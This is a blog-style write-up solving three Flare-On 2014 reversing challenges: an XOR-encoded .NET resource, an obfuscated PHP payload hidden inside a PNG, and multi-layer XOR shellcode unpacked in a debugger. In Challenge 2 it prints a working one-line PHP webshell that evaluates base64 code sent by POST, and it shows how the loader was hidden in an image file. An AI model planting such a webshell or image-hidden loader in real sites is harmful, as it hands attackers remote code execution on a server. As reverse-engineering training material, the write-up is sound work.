---
title: Flare-On 2014 Jan 2026
published: 2026-01-18
description: Writeup of Flare-On 2014.
tags:
  - Reversing
  - Flare-On
  - dnSpy
  - DotNET
image: images/cover.png
category: Flare-On Reversing Writeups
draft: false
---

- **Category: DotNET Reversing**
- **Difficulty: Easy**
- File:- [2014_FLAREOn_Challenges.zip](/uploads/Flare-On_2014/2014_FLAREOn_Challenges.zip)

# Challenge 1 - Bob Doge

## Stage 1 Extracting CAB File
### Initial Triage

- File Type: PE32+ executable for MS Windows 5.02 (GUI), x86-64, 6 sections
- Size: 279 KB
- SHA256: f8aac4d0cccabd11d7b10d63dc2acc451ea832077650971d3c66834861162981

### Basic Static Analysis:

- Detect it Easy (Die) show that this file is **self-extracted CAB/SFX style packing**, where the executable includes a compressed Microsoft Cabinet file (CAB) and extracts/executes it at runtime and it is just a **wrapper/loader**.
- The `.rsrc` section is compressed, which is why the tool flags **high entropy**, classic sign of packing or encryption.
- Compression algorithm used inside the CAB is **LZX** (as shown), which is common in Microsoft CAB archives.
- So we have to first extract the actual exe from this and analyze it,

![Pasted image 20260118140836.png](images/Pasted_image_20260118140836.png)

![Pasted image 20260118141726.png](images/Pasted_image_20260118141726.png)

- We can extract it using [cabextract](https://www.cabextract.org.uk/) tool, and it will written in `Challenge1.exe` file,

```bash
┌──(b14cky㉿DESKTOP-VRSQRAJ)-[/]
└─$ cabextract C1.exe.defused
Extracting cabinet: C1.exe.defused
  extracting Challenge1.exe

All done, no errors.
```

## Stage 2 Analysis of .NET Sample

### Initial Triage

- File Type: PE32 executable for MS Windows 4.00 (GUI), Intel i386 Mono/.Net assembly, 3 sections
- Size: 118 KB
- SHA256: c1b55c829a8420fa41e7a31344b6427045cea288458fe1c0f32cae47b2e812f2
### Basic Static Analysis:

- Detect it Easy (Die) show that this file is `.NET` binary written in `C#` using visual studio.
- Also `.text` is packed as per die because it show high entropy in it. 
 
![Pasted image 20260118142239.png](images/Pasted_image_20260118142239.png)

![Pasted image 20260118142850.png](images/Pasted_image_20260118142850.png)

- We know that this code compiles to **Microsoft Intermediate Language (MSIL or IL)**.
- IL is a **human-readable, high-level assembly-like language**, not raw CPU instructions.
- So we can read it using tools such as `dnSpy`, `Dotpeek` etc.
- here is the example of IL,

```asm
.method public hidebysig static void Main() cil managed
{
    .entrypoint
    ldstr "Hello, world!"
    call void [mscorlib]System.Console::WriteLine(string)
    ret
}
```

### Code Analysis

![Pasted image 20260118143113.png](images/Pasted_image_20260118143113.png)

- I used `dnSpy` for this analysis,
- In `Resources` i found something phishy which is `rev_challenge_1.dat_secret.encode` so i saved it and it looks like encrypted data,
- Also some cool memes 😂,

![Pasted image 20260118143314.png](images/Pasted_image_20260118143314.png)

![Pasted image 20260118143648.png](images/Pasted_image_20260118143648.png)

- Now Let's dive into actual code, so typically we start with `main` function in `Program` section,
- This code just **starts a Windows Forms GUI app and opens Form1** so `Form1` is the one we had to go,

![Pasted image 20260118143831.png](images/Pasted_image_20260118143831.png)

- Immediately we see one function `btnDecode_Click` which do some kind of math or crypto stuff, and it is loading that `rev_challenge_1.dat_secret.encode` file as input.

![Pasted image 20260118144043.png](images/Pasted_image_20260118144043.png)

- At first glance, honestly, I can't understand this code, so I take help from our friend GPT to explain it to me, and here is what I understand,

```asm
0xa1 0xb5 0x44        (original)
0x1a 0x5b 0x44        (swap hex digits)
(0x1a ^ 0x29) (0x5b ^ 0x29) (0x44 ^ 0x29) → 0x33 0x72 0x6d
```

### Flag Extraction

- So i load this input file into `CyberChef` and apply all the necessary filters and features to get decrypted result and here it is,

![Pasted image 20260118145903.png](images/Pasted_image_20260118145903.png)

- Here is out flag,

```yml
 3rmahg3rd.b0b.d0ge@flare-on.com
```

- Here is recipe of this,

```json
[
  { "op": "To Hex",
    "args": ["Space", 0] },
  { "op": "Remove whitespace",
    "args": [true, true, true, true, true, false] },
  { "op": "Find / Replace",
    "args": [{ "option": "Regex", "string": "([0-9a-fA-F])([0-9a-fA-F])" }, "$2$1", true, false, true, false] },
  { "op": "Remove whitespace",
    "args": [true, true, true, true, true, false] },
  { "op": "From Hex",
    "args": ["Auto"] },
  { "op": "XOR",
    "args": [{ "option": "Decimal", "string": "41" }, "Standard", false] }
]
```

- Here is the similar py script for doing this same task,

```py
#!/usr/bin/env python3
"""
Replicates CyberChef operations:
1. From Hexdump
2. To Hex (space delimited)
3. Remove whitespace
4. Find/Replace (swap hex digit pairs)
5. Remove whitespace
6. From Hex
7. XOR with 41 (decimal)
"""

import re
import sys

def from_hexdump(data):
    """Extract hex bytes from hexdump format"""
    lines = data.strip().split('\n')
    hex_bytes = []
    
    for line in lines:
        # Remove offset and ASCII representation, keep only hex bytes
        parts = line.split()
        for part in parts:
            # Skip offset (contains colon) and non-hex parts
            if ':' in part or not all(c in '0123456789abcdefABCDEF' for c in part):
                continue
            # Add hex bytes (typically 2 chars each)
            for i in range(0, len(part), 2):
                if i + 1 < len(part):
                    hex_bytes.append(part[i:i+2])
    
    return bytes.fromhex(''.join(hex_bytes))

def to_hex_space(data):
    """Convert bytes to space-separated hex"""
    return ' '.join(f'{b:02x}' for b in data)

def remove_whitespace(text):
    """Remove all whitespace"""
    return re.sub(r'\s+', '', text)

def swap_hex_pairs(text):
    """Swap each pair of hex digits: AB -> BA"""
    return re.sub(r'([0-9a-fA-F])([0-9a-fA-F])', r'\2\1', text)

def from_hex(hex_string):
    """Convert hex string to bytes"""
    return bytes.fromhex(hex_string)

def xor_decrypt(data, key):
    """XOR each byte with the key"""
    return bytes(b ^ key for b in data)

def main():
    input_file = 'rev_challenge_1.dat_secret.encode'
    
    try:
        # Read input file in binary mode
        with open(input_file, 'rb') as f:
            data = f.read()
        
        print(f"[+] Reading from {input_file}")
        
        # Step 1: From Hexdump - skip this step, data is already binary
        print("[+] Step 1: Using binary data directly")
        step1 = data
        
        # Step 2: To Hex (space delimited)
        print("[+] Step 2: To Hex (space delimited)")
        step2 = to_hex_space(step1)
        
        # Step 3: Remove whitespace
        print("[+] Step 3: Remove whitespace")
        step3 = remove_whitespace(step2)
        
        # Step 4: Find/Replace - swap hex digit pairs
        print("[+] Step 4: Swap hex digit pairs")
        step4 = swap_hex_pairs(step3)
        
        # Step 5: Remove whitespace (again)
        print("[+] Step 5: Remove whitespace")
        step5 = remove_whitespace(step4)
        
        # Step 6: From Hex
        print("[+] Step 6: From Hex")
        step6 = from_hex(step5)
        
        # Step 7: XOR with 41 (decimal)
        print("[+] Step 7: XOR with 41")
        result = xor_decrypt(step6, 41)
        
        # Output result
        print("\n" + "="*60)
        print("DECODED OUTPUT:")
        print("="*60)
        try:
            print(result.decode('utf-8', errors='replace'))
        except:
            print(result)
        print("="*60)
        
        # Save to file
        output_file = 'decoded_output.txt'
        with open(output_file, 'wb') as f:
            f.write(result)
        print(f"\n[+] Output saved to {output_file}")
        
    except FileNotFoundError:
        print(f"[!] Error: File '{input_file}' not found")
        print(f"[!] Please ensure the file exists in the current directory")
        sys.exit(1)
    except Exception as e:
        print(f"[!] Error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == '__main__':
    main()
```

# Challenge 2: Javascrap

## Stage 0 Character Table Construction

### Initial Triage

- Challenge Type: Reverse-Engineering / Web / Obfuscated Code
- Files Provided:
    - `home.html`
	    - File Type: home.html: HTML document, Unicode text, UTF-8 text, with very long lines (1428), with CRLF line terminators
		- Size: 8.17 KB
		- SHA256: d1b235e49336c2e510100bd3ffa3113d9c757ffb4829e9564597dbab8338b710
    - `img/flare-on.png` (PNG image) 
	    - File Type: img/flare-on.png: PNG image data, 400 x 79, 8-bit/color RGBA, non-interlaced
		- Size: 9.33 KB
		- SHA256: 87528d13f40b51b6de90124fb92bcbc38a54e5241cd7ef969208c0707ed893dd

### Basic Static Analysis:

- The PNG is being **included as PHP code** via an `include` in the HTML page: i.e., the challenge hides a PHP script inside what looks like an image.

![Pasted image 20260119201225.png](images/Pasted_image_20260119201225.png)

- Performing strings on `flare-on.png` reveals appended PHP source code instead of pure image data.

![Pasted image 20260119201531.png](images/Pasted_image_20260119201531.png)

- The appended PHP contains two large arrays: `$terms` and `$order`, and a reconstruction loop that builds a second PHP script dynamically. 

## Stage 1: Obfuscation Decoding

### 1: Character Table Reconstruction

The embedded PHP begins:

![Pasted image 20260119202546.png](images/Pasted_image_20260119202546.png)

```php
$terms = array("M","Z","]","p",...,"|");
$order = array(59,71,73,13,...,47);
$do_me="";
for($i=0;$i<count($order);$i++){
    $do_me=$do_me.$terms[$order[$i]];
}
print($do_me);
```

- `$terms` is a **custom character lookup table** - each entry is a single character.
- `$order` is a list of integers, each an index into `$terms`. 
- The loop concatenates `$terms[$order[i]]` to form a complete PHP script string in `$do_me`. 
- Instead of running `eval()` immediately, you can replace it with `print` to **dump the generated code** for analysis. 

## Stage 2: Second-Layer Decoding

After reconstructing the inner PHP, the output looks like:

![Pasted image 20260119202723.png](images/Pasted_image_20260119202723.png)

```php
$_  = 'aWYoaXNzZXQoJF9QT1NUWyJcOTdcNDlc ...';
$__ = 'JGNvZGU9YmFzZTY0X2RlY29kZSgkXyk7ZXZhbCgkY29kZSk7';
$___ = "\x62\141\x73\145\x36\64\x5f\144\x65\143\x6f\144\x65";
eval($___($__));
```

- `$_` and `$__` are **Base64-encoded** strings. 
- `$___` is obfuscated with **hex escape sequences** representing the string `base64_decode`. 
- `eval($___($__))` resolves to:

```php
$code = base64_decode($_);
eval($code);
```

This decodes the next stage of the script and executes it. 

## Stage 3: Escaped Payload Interpretation

![Pasted image 20260119202813.png](images/Pasted_image_20260119202813.png)

The inner decoded PHP is:

```php
if (isset($_POST["\97\49\49\68\x4F\84\116\x68\97\x74\x44\x4F..."])){
    eval(base64_decode($_POST["\97\49\x31\68\x4F\x54\116\104..."]));
}
```

- The `$_POST` key names are obfuscated using a **mix of octal (`\NNN`) and hex (`\xNN`) escapes**. 
- To understand the actual identifier, all escape sequences must be converted into ASCII. 

## Stage 4: Normalization and Flag Extraction

![Pasted image 20260119202842.png](images/Pasted_image_20260119202842.png)

The decoded sequence:

```
a11DOTthatDOTjava5crapATflareDASHonDOTcom
```

comes from interpreting those escape sequences as numbers and converting them to characters.   
Replace placeholder tokens:

- `DOT` → `.`
- `AT` → `@`
- `DASH` → `-`

- Final flag:

```yml
a11.that.java5crap@flare-on.com
```

## Final Behavior

The decoded PHP callback becomes:

```php
if (isset($_POST["a11.that.java5crap@flare-on.com"])) {
    eval(base64_decode($_POST["a11.that.java5crap@flare-on.com"]));
}
```

- This is a **simple PHP webshell** that executes Base64-encoded PHP from an HTTP POST field if sent under the correct key. 

# Challenge 3: 

## Stage 1 Extracting Shellcode from Wrapper EXE 
### Initial Triage

- File Type: PE32 executable (console) Intel 80386 (stripped to external PDB), for MS Windows
- Size: 7 KB
- SHA256: 4ab2023b2f34c8c49ffd15a051b46b6be13cb84775142ec85403a08c0d846c72

### Basic Static Analysis

- Detect it Easy (Die) show that this file is **C Compiled File**, and `Tiny C` compiler was used to compile it, also it can be stripped as per file command results.
- In Entropy section we can see that there is only 2 section which is `.text` and `.data`, 

![Pasted image 20260121104440.png](images/Pasted_image_20260121104440.png)

![Pasted image 20260121104830.png](images/Pasted_image_20260121104830.png)

- PEStudio Shows that most of data is on `.text` section and raw-size is `6144 bytes`,

![Pasted image 20260121105229.png](images/Pasted_image_20260121105229.png)

### Advance Static Analysis 

- I have used IDA Free to do disassemble the exe file,
	- In that i opened `start` function which has some interesting functions and particularly this `sub_401000`,

![Pasted image 20260121105432.png](images/Pasted_image_20260121105432.png)

- In this `sub_401000` function, there are multiple bytes which are being pushed into stack and at the end it being called using this instruction,   

![Pasted image 20260121110122.png](images/Pasted_image_20260121110122.png)

```asm
.text:00401000 ; int __cdecl sub_401000(_DWORD, _DWORD, _DWORD)
.text:00401000 sub_401000      proc near               ; CODE XREF: start+6A↓p
.text:00401000
.text:00401000 var_201         = byte ptr -201h
.text:00401000 var_200         = byte ptr -200h
...
.text:00401000                 push    ebp
.text:00401001                 mov     ebp, esp
.text:00401003                 sub     esp, 204h
.text:00401009                 nop
.text:0040100A                 mov     eax, 0E8h
.text:0040100F                 mov     [ebp+var_201], al
.text:00401015                 mov     eax, 0
.text:0040101A                 mov     [ebp+var_200], al
...
.text:00402492                 mov     [ebp+var_1], al
.text:00402495                 lea     eax, [ebp+var_201]
.text:0040249B                 call    eax
```

- It means it means it can `shellcode` because `0E8h` is being pushed, it means `call target`, 
- but why this importent,
	- Shellcode has a huge problem: **It does NOT know its own address**
		- it can be placed anywhere in memory
		- no imports
		- no fixed base
		- no PE headers
### Advanced Dynamic Analysis

- So to extract the shellcode we will use `x32dbg` because we have 32 bit binary and put a breakpoint in this particular `0040249B` offset which is `call eax` so we will dump `EAX` into memory and carve it and move further.
- But first we land in `entry point` of program,

```asm
004024C0 | 55                       | push ebp                                
004024C1 | 89E5                     | mov ebp,esp                             
004024C3 | 81EC 2C000000            | sub esp,2C                              
```

![Pasted image 20260121111145.png](images/Pasted_image_20260121111145.png)

- So we can go to that location using `CTRL + G` shortcut,

![Pasted image 20260121111257.png](images/Pasted_image_20260121111257.png)

- We will put breakpoint using using `F2` in that instruction,

```asm
00402495 | 8D85 FFFDFFFF            | lea eax,dword ptr ss:[ebp-201]          
0040249B | FFD0                     | call eax                                
0040249D | B8 00000000              | mov eax,0                               
```

![Pasted image 20260121111432.png](images/Pasted_image_20260121111432.png)

- So now we will run till this breakpoint and dump the `EAX` content inside the dump windows,
- And again we can see that there is `E8 00 00..` format which means it will be shellcode so we can dump this using this command,

```
savedata "C:\Users\Asus\Desktop\shellcode.bin", EAX, 0x4000
```

![Pasted image 20260121111909.png](images/Pasted_image_20260121111909.png)

![Pasted image 20260121112242.png](images/Pasted_image_20260121112242.png)

- So it will be written in `shellcode.bin`,

## Stage 2 Analyzing Shellcode 
### Initial Triage

- File Type: data
- Size: 16 KB
- SHA256: 7d60f98eaa49863a604f75425ced94f86faf2eb9d83e0c1ce7490c852930f44e
### Advance Static Analysis

- To get the hex code we can use `HxD` tool and copy from there and I used `cutter` for this analysis because it gives graph view, so paste it into that `cutter`,

![Pasted image 20260121113255.png](images/Pasted_image_20260121113255.png)

- I remove some bytes which are not that important, after  `0xC995`,

```
E8 00 00 00 00 8B 34 24 83 C6 1C B9 DF 01 00 00 83 F9 00 74 07 80 36 66 46 49 EB F4 E9 10 00 00 00 07 08 02 46 15 09 46 0F 12 46 04 03 01 0F 08 15 0E 13 15 66 66 0E 15 07 13 14 0E 08 09 16 07 EF 85 8E 66 66 66 66 ED 52 42 E5 A0 4B EF 97 E7 A7 EA 67 66 66 EF BE E5 A6 6C 5F BE 13 63 EF 85 E5 A5 62 5F A8 12 6E EC 75 56 70 25 20 8D 8D 8F 57 66 66 66 6F 6C 62 27 67 62 72 70 6A 35 7C 66 36 60 70 73 33 7A 7C 65 2F 6C 72 27 66 68 33 70 72 78 66 29 7E 66 67 63 33 7D 7D 35 7C 61 73 27 65 66 7A 7A 67 FD 08 09 16 07 9E 33 37 97 D5 0B B1 31 17 07 15 84 EA 14 6D 1B 89 3F 74 48 79 40 90 D2 17 96 E1 0D FD EA FA C8 7F 53 71 5A E9 CE 74 48 79 40 E1 CB EF C2 02 34 45 61 48 20 5F 3C 07 3F 0C 23 1B 3B 0D 28 05 7B 1E 3E 02 2F 09 60 1E 20 10 3E 16 7A ED AD 9C 48 79 40 71 D0 4B 76 E9 80 57 C9 86 C9 BE 85 71 5A 64 C7 AC CB B9 58 48 83 0A 57 E3 A5 F9 83 73 71 B1 27 79 D0 77 7E 62 0B 3F AB 9A B2 62 52 6A 46 66 58 73 00 38 15 39 00 21 5F 25 15 24 1E 32 1E 1F 5B 70 42 7A 1A 7B 18 7E 10 75 15 60 55 3A 55 0D 60 78 17 61 4D 7C 5A 7A 46 26 40 65 0D 31 0B 6F 4B 72 09 71 52 D8 D1 E3 72 0B 2A 17 A4 30 18 DC FA 2F B6 E7 F0 94 06 16 2D 16 F2 CE A2 8A 3D 37 B8 63 21 9B DF 81 ED 40 18 CC 59 03 F5 43 54 06 7C 4B 8D F8 63 E4 F2 5A 76 FA 4A E6 53 62 90 66 13 FF 0C 60 88 4D 38 FF 5E F1 77 7B 7D 40 E1 F0 8E 7B 7C 5B D4 30 39 2A 9E F6 38 49 1F F0 28 99 95 4B F2 61 DB 62 D0 56 48 05 22 12 29 8A D2 45 49 20 75 0D 3F 48 AC F3 29 52 07 A3 34 BB 7F 05 98 10 58 72 C8 E6 67 9D E0 75 88 1B 66 55 73 76 24 1C 7F 19 0D 46 2F 25 35 14 8D 80 B2 2E 4B 01 80 32 1C 95 C9 00
```

![Pasted image 20260121113539.png](images/Pasted_image_20260121113539.png)

- It is loop that doing some stuff,
	- The CALL instruction is not for calling a function 
	- It is used to steal the current address so the code can decrypt and execute itself.
	- So it means `call 5` will pushes `0x00000005` onto stack jumps to `0x00000005` now stack has `[rsp] = address_of_shellcode` then `mov esi, [rsp]` will push it into `esi` which means `0x05 + 0x1C = 0x21`,
- seg000:00000021 to seg000:00000030 is encrypted block,

![Pasted image 20260121121437.png](images/Pasted_image_20260121121437.png)

```asm
0x00000000      call    5          ;  fcn.00000000(void)
0x00000005      mov     esi, dword [rsp]
0x00000008      add     esi, 0x1c
0x0000000b      mov     ecx, 0x1df
0x00000010      cmp     ecx, 0
```

- Decryption block with key `0x66`

```asm
0x00000015  xor byte [rsi], 0x66
0x00000018  jmp 0x10
```

- So here is the whole summarized flow, 

```asm
call → pop → add offset → xor loop (key 0x66) → jump
```

![Pasted image 20260121113604.png](images/Pasted_image_20260121113604.png)

- Possible Pseudocode,

```c
base = get_rip();
payload = base + 0x1c;

for (i = 0; i < 0x1df; i++) {
    payload[i] ^= 0x66;
}

jump_to(payload);
```

- There is one block which is encrypted so i used, `cyberchef` to decrypt it with key `0x66`

![Pasted image 20260121120858.png](images/Pasted_image_20260121120858.png)

![Pasted image 20260121120739.png](images/Pasted_image_20260121120739.png)

- Decrypted String 1,

```
and so it begins
```

- But you can see how tedious is this task in static analysis so to do this easiness we can use dynamic method.
### Advanced Dynamic Analysis

- Again, i can use `x32dgb` for this task,
#### Layer 1 XORed Encryption

- This loop is doing decryption of encrypted text

```asm
0019FD43 | 83F9 00                  | cmp ecx,0                               
0019FD46 | 74 07                    | je 19FD4F
0019FD48 | 8036 66                  | xor byte ptr ds:[esi],66               
0019FD4B | 46                       | inc esi                                 
0019FD4C | 49                       | dec ecx     
0019FD4D | EB F4                    | jmp 19FD43                            
```

![Pasted image 20260121132031.png](images/Pasted_image_20260121132031.png)

```
0019FD53 00 61 6E 64 20 73 6F 20 69 74 20 62 65 67 69 6E  .and so it begin  
0019FD63 73 68 75 73 00 00 68 73 61 75 72 68 6E 6F 70 61  shus..hsaurhnopa  
```

- Decrypted String 1,

```yml
so it begins
```

#### Layer 2 XORed Encryption

- for next layer just step through the instructions by doing `step over`,
- This instructions are loading layer 2 decryption key in stack which is 

```asm
0019FD69 | 68 73617572              | push 72756173                           
0019FD6E | 68 6E6F7061              | push 61706F6E                          
0019FD73 | 89E3                     | mov ebx,esp                             
```

- Here is actual key in hex `6E 6F 70 61 72 73 61 75 72 75 73` which is `nopasaurus`,

![Pasted image 20260121133313.png](images/Pasted_image_20260121133313.png)

![Pasted image 20260121132418.png](images/Pasted_image_20260121132418.png)

- Now the actual loop begins and decryption starts using this key `nopasaurus`,

```asm
0019FD8D | 39D8                     | cmp eax,ebx                             
0019FD8F | 75 05                    | jne 19FD96                              
0019FD91 | 89E3                     | mov ebx,esp                             
0019FD93 | 83C3 04                  | add ebx,4                               
0019FD96 | 39CE                     | cmp esi,ecx                             
0019FD98 | 74 08                    | je 19FDA2                               
0019FD9A | 8A13                     | mov dl,byte ptr ds:[ebx]                
0019FD9C | 3016                     | xor byte ptr ds:[esi],dl                
0019FD9E | 43                       | inc ebx                                 
0019FD9F | 46                       | inc esi                                
0019FDA0 | EB EB                    | jmp 19FD8D                             
```

![Pasted image 20260121133701.png](images/Pasted_image_20260121133701.png)

```
0019FDA6 00 67 65 74 20 72 65 61 64 79 20 74 6F 20 67 65  .get ready to ge  
0019FDB6 74 20 6E 6F 70 27 65 64 20 73 6F 20 64 61 6D 6E  t nop'ed so damn  
0019FDC6 20 68 61 72 64 20 69 6E 20 74 68 65 20 70 61 69   hard in the pai  
0019FDD6 6E 74 E8 00 00 00 00 8B 34 24 83 C6 1E B9 38 01  ntè.....4$.Æ.¹8.  
```

- Decrypted String 2,

```yml
get ready to get nop'ed so damn hard in the paint
```

#### Layer 3 XORed Encryption

- This is where 3rd loop starts and decryption starts with hardcoded hex `0x624F6C47`,

![Pasted image 20260121135337.png](images/Pasted_image_20260121135337.png)

```asm
0019FDE3 | B9 38010000              | mov ecx,138                             
0019FDE8 | 83F9 00                  | cmp ecx,0                               
0019FDEB | 7E 0E                    | jle 19FDFB                              
0019FDED | 8136 624F6C47            | xor dword ptr ds:[esi],476C4F62         
0019FDF3 | 83C6 04                  | add esi,4                               
0019FDF6 | 83E9 04                  | sub ecx,4                               
0019FDF9 | EB ED                    | jmp 19FDE8                              
```

- This wrote some gibberish in memory, 

```
0019FDF6 83 E9 04 EB ED 8D 80 00 00 00 00 8D 80 00 00 00  .é.ëí...........  
0019FE06 00 90 90 90 90 68 72 3F 21 3F 68 20 6F 76 65 68  .....hr?!?h oveh  
0019FE16 6D 6F 73 74 68 74 20 61 6C 68 69 73 20 69 68 6F  mostht alhis iho  
0019FE26 6D 67 20 89 E3 E8 00 00 00 00 8B 34 24 83 C6 2D  mg .ãè.....4$.Æ-  
```

- After spending some time i realize that it is actually strings which is being loaded next, 

![Pasted image 20260121135106.png](images/Pasted_image_20260121135106.png)

```asm
0019FE0B | 68 723F213F              | push 3F213F72                           
0019FE10 | 68 206F7665              | push 65766F20                           
0019FE15 | 68 6D6F7374              | push 74736F6D                           
0019FE1A | 68 7420616C              | push 6C612074                           
0019FE1F | 68 69732069              | push 69207369                           
0019FE24 | 68 6F6D6720              | push 20676D6F                           
0019FE29 | 89E3                     | mov ebx,esp                             
```

![Pasted image 20260121135559.png](images/Pasted_image_20260121135559.png)

- I take all hex convert it in `Big endian format` and arrange it in `FILO (First in Last out) order` because it is loaded in stack so here is the strings,
- Interestingly this same text used as key for next layer.

```yml
omg i sit almost over?!?
```

![Pasted image 20260121135835.png](images/Pasted_image_20260121135835.png)

#### Layer 4 XORed Encryption

- Here is loop which start with previous string as key for decryption routine,

```asm
0019FE43 | 39D8                     | cmp eax,ebx                             
0019FE45 | 75 05                    | jne 19FE4C                              
0019FE47 | 89E3                     | mov ebx,esp                             
0019FE49 | 83C3 04                  | add ebx,4                               
0019FE4C | 39CE                     | cmp esi,ecx                             
0019FE4E | 74 08                    | je 19FE58                               
0019FE50 | 8A13                     | mov dl,byte ptr ds:[ebx]                
0019FE52 | 3016                     | xor byte ptr ds:[esi],dl                
0019FE54 | 43                       | inc ebx                                 
0019FE55 | 46                       | inc esi                                 
0019FE56 | EB EB                    | jmp 19FE43                              
```

![Pasted image 20260121140344.png](images/Pasted_image_20260121140344.png)

```
0019FE56 EB EB E9 1D 00 00 00 73 75 63 68 2E 35 68 33 31  ëëé....such.5h31  
0019FE66 31 30 31 30 31 30 31 40 66 6C 61 72 65 2D 6F 6E  1010101@flare-on  
0019FE76 2E 63 6F 6D 68 6E 74 00 00 68 20 73 70 65 68 20  .comhnt..h speh   
```

![Pasted image 20260121140451.png](images/Pasted_image_20260121140451.png)

- Here is Final Flag.... 😗

```yml
such.5h311010101@flare-on.com
```
